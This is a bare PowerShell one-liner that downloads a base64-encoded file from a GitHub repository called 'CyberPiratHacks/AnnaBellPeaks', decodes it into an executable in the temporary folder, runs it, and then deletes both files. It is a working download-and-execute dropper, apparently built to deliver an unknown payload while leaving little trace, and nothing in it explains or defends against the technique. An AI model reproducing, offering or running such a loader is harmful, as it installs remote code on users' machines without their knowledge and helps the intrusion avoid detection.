$url = "https://raw.githubusercontent.com/CyberPiratHacks/AnnaBellPeaks/main/arquivo_base64.txt"; $tempFile = "$env:TEMP\arquivo_base64.txt"; Invoke-WebRequest -Uri $url -OutFile $tempFile; $content = Get-Content -Path $tempFile -Raw; $decodedBytes = [Convert]::FromBase64String($content); $executablePath = "$env:TEMP\executavel.exe"; [System.IO.File]::WriteAllBytes($executablePath, $decodedBytes); Start-Process -FilePath $executablePath -Wait; if (Test-Path $tempFile) { Remove-Item $tempFile -Force }; if (Test-Path $executablePath) { Remove-Item $executablePath -Force }
